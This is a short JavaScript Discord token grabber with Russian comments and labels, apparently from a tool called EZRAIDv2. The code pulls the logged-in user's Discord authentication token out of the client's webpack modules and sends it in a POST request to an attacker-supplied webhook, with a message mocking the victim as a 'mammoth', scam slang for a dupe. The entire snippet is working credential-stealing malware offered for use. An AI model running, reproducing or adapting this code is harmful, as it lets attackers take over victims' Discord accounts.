function getToken(){
    var webhook="Введите тут URL для вебхука :)"
    var token=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
     var request = new XMLHttpRequest();
     request.open("POST", webhook);
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
        username: "Токен граббер от EZRAIDv2",
        avatar_url: "",
        content: "**А вот и токен от :mammoth: подъехал!**\n**Токен: **`" + token + "`"
      }
      request.send(JSON.stringify(params));
}
getToken()
